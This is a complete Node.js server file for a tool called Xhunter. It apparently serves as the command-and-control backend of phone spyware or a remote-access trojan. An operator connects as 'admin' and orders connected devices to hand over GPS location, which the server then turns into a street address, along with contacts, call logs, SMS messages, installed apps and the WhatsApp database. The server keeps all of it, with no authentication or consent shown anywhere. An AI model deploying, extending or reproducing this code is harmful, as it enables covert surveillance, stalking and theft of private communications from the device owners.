/* server.js — Xhunter backend (enhanced, complete)
   Node 20+ (fetch builtin), express + socket.io
   حفظ: node server.js
*/

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
app.use(cors({ origin: "*" }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const io = new Server(server, {
  maxHttpBufferSize: 1e8,
  cors: { origin: "*", methods: ["GET","POST"], credentials: true }
});

const port = process.env.PORT || 8080;
server.listen(port, () => console.log(`[LOG] Server running on port ${port}`));

// In-memory stores (could be persisted to DB)
const devices = {};      // deviceId -> { id, model, ip, screen, language, socketId, lastSeen, lastLocation, api, ... }
const logs = [];         // array of { ts, level, msg }
const pendingRequests = {}; // deviceId -> action -> [{ id: reqId, resolve, reject, timer }]

// utility logging
function addLog(msg, level='info'){
  const entry = { ts: Date.now(), level, msg };
  logs.push(entry);
  console.log(`[${level.toUpperCase()}] ${new Date(entry.ts).toISOString()} - ${msg}`);
  if(logs.length > 3000) logs.shift();
}

// helper: get remote IP (behind proxies)
function getRemoteIP(socket, payloadIp){
  const forwarded = socket.handshake.headers['x-forwarded-for'];
  const sockAddr = socket.handshake.address;
  const via = forwarded ? forwarded.split(',')[0].trim() : null;
  return payloadIp || via || sockAddr || 'unknown';
}

// helper: uuid
function uuid(){
  return crypto.randomUUID ? crypto.randomUUID() : crypto.createHash('sha1').update(String(Math.random())).digest('hex');
}

// Reverse geocode (OpenStreetMap Nominatim) — polite usage, no heavy rate
async function reverseGeocode(lat, lon){
  try{
    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`;
    const res = await fetch(url, { headers: { 'User-Agent': 'Xhunter/1.0 (contact@yourdomain.example)' } });
    if(!res.ok) return null;
    const j = await res.json();
    return j.display_name || null;
  }catch(e){
    return null;
  }
}

// pendingRequests management
function addPending(deviceId, action, timeoutMs = 10000){
  const reqId = uuid();
  if(!pendingRequests[deviceId]) pendingRequests[deviceId] = {};
  if(!pendingRequests[deviceId][action]) pendingRequests[deviceId][action] = [];
  let timer;
  const promise = new Promise((resolve, reject) => {
    timer = setTimeout(()=> {
      const arr = pendingRequests[deviceId] && pendingRequests[deviceId][action];
      if(arr){
        const idx = arr.findIndex(x => x.id === reqId);
        if(idx !== -1) arr.splice(idx,1);
      }
      reject(new Error('timeout'));
    }, timeoutMs);
    pendingRequests[deviceId][action].push({ id: reqId, resolve, reject, timer });
  });
  return { reqId, promise };
}

function resolvePending(deviceId, action, payload){
  const arr = pendingRequests[deviceId] && pendingRequests[deviceId][action];
  if(arr && arr.length > 0){
    const item = arr.shift(); // FIFO
    clearTimeout(item.timer);
    try{ item.resolve(payload); } catch(e){/*ignore*/ }
    return true;
  }
  return false;
}

// Express API
app.get('/api/devices', (req,res) => {
  // return limited view (avoid huge data)
  const out = {};
  Object.keys(devices).forEach(k=>{
    out[k] = Object.assign({}, devices[k]);
    // don't send large fields (like whatsappDB) raw
    if(out[k].whatsappDB) out[k].whatsappDB = '[redacted: base64 data]';
  });
  res.json({ ok:true, devices: out });
});
app.get('/api/logs', (req,res) => {
  res.json({ ok:true, logs: logs.slice(-500) });
});

// Socket.IO connection
io.on('connection', (socket) => {
  addLog(`Socket connected: ${socket.id}`);

  // Admin joins
  socket.on('adminJoin', () => {
    addLog(`Admin connected: ${socket.id}`);
    // send full devices snapshot
    Object.values(devices).forEach(d => socket.emit('join', d));
  });

  // Device joins (client emits 'join' with descriptor)
  socket.on('join', (devicePayload) => {
    try{
      const payload = devicePayload || {};
      const id = payload.id || ('device_' + Math.floor(Math.random()*10000));
      const remoteIp = getRemoteIP(socket, payload.ip);
      const now = Date.now();

      const enrich = {
        id,
        model: payload.model || payload.userAgent || payload.ua || 'unknown',
        ip: remoteIp,
        language: payload.language || payload.lang || null,
        screen: payload.screen || null,
        platform: payload.platform || null,
        cookiesEnabled: payload.cookiesEnabled !== undefined ? payload.cookiesEnabled : null,
        socketId: socket.id,
        lastSeen: now,
        lastJoinTs: now,
        api: payload.api || null
      };
      devices[id] = Object.assign(devices[id] || {}, enrich);
      addLog(`Device join: ${id} (${enrich.model}) IP:${enrich.ip}`);

      // notify admin(s)
      socket.broadcast.emit('join', devices[id]);
      io.emit('join', devices[id]);
    } catch(e){
      addLog('Error on join: ' + e.message, 'error');
    }
  });

  // Admin->Server request relay
  socket.on('request', async (d) => {
    let parsed = d;
    if(typeof d === 'string'){
      try{ parsed = JSON.parse(d); } catch(e){ parsed = d; }
    }
    const to = parsed.to;
    const action = parsed.action;
    const data = parsed.data || null;
    const options = parsed.options || {};
    addLog(`Admin request: ${action} -> ${to} (opts: ${JSON.stringify(options)})`);

    if(!to || !action){
      addLog('Invalid request from admin: missing to/action', 'warn');
      socket.emit('requestFailed', JSON.stringify({ to, action, reason: 'missing_params' }));
      return;
    }
    const targetSocketId = devices[to] && devices[to].socketId;
    if(!targetSocketId){
      addLog(`Target device ${to} not connected`, 'warn');
      socket.emit('requestFailed', JSON.stringify({ to, action, reason: 'not_connected' }));
      return;
    }

    // Special handling for getLocation (with retries/timeouts)
    if(action === 'getLocation'){
      const timeoutMs = options.timeout || 12000;
      const retries = options.retries !== undefined ? options.retries : 2;
      const highAccuracy = options.highAccuracy === undefined ? true : !!options.highAccuracy;
      let attempt = 0;
      let lastErr = null;

      async function attemptOnce(){
        attempt++;
        addLog(`Forwarding getLocation attempt ${attempt} -> ${to}`);
        io.to(targetSocketId).emit('getLocation', { requestId: uuid(), options: { highAccuracy } });
        try{
          const { promise } = addPending(to, 'getLocation', timeoutMs);
          const payload = await promise;
          addLog(`Location reply from ${to}: ${JSON.stringify(payload).slice(0,200)}`);
          if(payload && payload.data && typeof payload.data.lat === 'number'){
            const lat = payload.data.lat, lon = payload.data.lon;
            devices[to].lastLocation = { lat, lon, ts: Date.now(), accuracy: payload.data.accuracy || null };
            try{
              const addr = await reverseGeocode(lat, lon);
              if(addr) devices[to].lastLocation.address = addr;
            }catch(e){}
            io.emit('getLocation', { id: to, data: devices[to].lastLocation });
            return payload;
          } else {
            lastErr = new Error('invalid_payload');
            throw lastErr;
          }
        }catch(err){
          lastErr = err;
          addLog(`Attempt ${attempt} for ${to} failed: ${err && err.message ? err.message : err}`, 'warn');
          if(attempt <= retries){
            await new Promise(r => setTimeout(r, 700));
            return attemptOnce();
          }
          throw lastErr;
        }
      }

      try{
        const result = await attemptOnce();
        socket.emit('requestResult', JSON.stringify({ to, action, ok: true, result }));
      }catch(err){
        addLog(`getLocation final failure for ${to}: ${err.message}`, 'error');
        socket.emit('requestResult', JSON.stringify({ to, action, ok: false, reason: err.message }));
      }
      return;
    }

    // Other actions: forward and optionally wait for response
    const waitForResponse = options.waitForResponse !== false;
    io.to(targetSocketId).emit(action, Object.assign({}, data || {}, { requestId: uuid() }));
    addLog(`Emitted ${action} -> ${to} (socket ${targetSocketId})`);

    if(waitForResponse){
      try{
        const { promise } = addPending(to, action, options.timeout || 8000);
        const payload = await promise;
        if(action === 'getInstalledApps') devices[to].installedApps = payload.data || payload;
        if(action === 'getContacts') devices[to].contacts = payload.data || payload;
        if(action === 'getCallLog') devices[to].callLog = payload.data || payload;
        if(action === 'getSMS') devices[to].sms = payload.data || payload;
        if(action === 'getExtraData') devices[to].extra = payload.data || payload;
        socket.emit('requestResult', JSON.stringify({ to, action, ok:true, result: payload }));
      }catch(err){
        addLog(`No response for ${action} from ${to}: ${err.message}`, 'warn');
        socket.emit('requestResult', JSON.stringify({ to, action, ok:false, reason: err.message }));
      }
    } else {
      socket.emit('requestResult', JSON.stringify({ to, action, ok:true, message:'sent' }));
    }
  });

  // Device event handlers (generic)
  const deviceEvents = ['getLocation','getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase','getExtraData'];
  deviceEvents.forEach(ev => {
    socket.on(ev, async (payload, callback) => {
      try{
        let deviceId = payload && (payload.id || payload.ID || payload.deviceId) ? (payload.id || payload.ID || payload.deviceId) : null;
        let data = payload && payload.data !== undefined ? payload.data : payload;

        if(!deviceId){
          for(const id in devices){
            if(devices[id].socketId === socket.id){
              deviceId = id;
              break;
            }
          }
        }

        if(!deviceId){
          addLog(`Received ${ev} but could not determine device id (socket ${socket.id})`, 'warn');
          return;
        }

        devices[deviceId] = Object.assign(devices[deviceId] || {}, { socketId: socket.id, lastSeen: Date.now() });

        addLog(`Device event ${ev} from ${deviceId} payload: ${JSON.stringify(data).slice(0,200)}`);

        switch(ev){
          case 'getInstalledApps':
            devices[deviceId].installedApps = data;
            break;
          case 'getContacts':
            devices[deviceId].contacts = data;
            break;
          case 'getCallLog':
            devices[deviceId].callLog = data;
            break;
          case 'getSMS':
            devices[deviceId].sms = data;
            break;
          case 'getExtraData':
            devices[deviceId].extra = data;
            break;
          case 'downloadWhatsappDatabase':
            devices[deviceId].whatsappDB = data;
            break;
          case 'getLocation':
            if(data && typeof data.lat === 'number' && typeof data.lon === 'number'){
              devices[deviceId].lastLocation = { lat: data.lat, lon: data.lon, accuracy: data.accuracy || null, ts: Date.now() };
              reverseGeocode(data.lat, data.lon).then(addr => {
                if(addr) {
                  devices[deviceId].lastLocation.address = addr;
                  io.emit('getLocation', { id: deviceId, data: devices[deviceId].lastLocation });
                }
              }).catch(()=>{});
            }
            break;
        }

        const matched = resolvePending(deviceId, ev, { id: deviceId, data });
        if(!matched){
          io.emit(ev, { id: deviceId, data });
        } else {
          io.emit(ev, { id: deviceId, data });
        }

        if(typeof callback === 'function'){
          try{ callback({ ok: true }); } catch(e){}
        }
      } catch(err){
        addLog(`Error handling device event ${ev}: ${err.message}`, 'error');
      }
    });
  });

  // disconnect
  socket.on('disconnect', (reason) => {
    addLog(`Socket disconnected ${socket.id} (${reason})`);
    for(const id in devices){
      if(devices[id].socketId === socket.id){
        devices[id].socketId = null;
        devices[id].lastSeen = Date.now();
        io.emit('disconnectClient', socket.id);
        addLog(`Device ${id} disconnected`);
      }
    }
  });

}); // end io.on(connection)
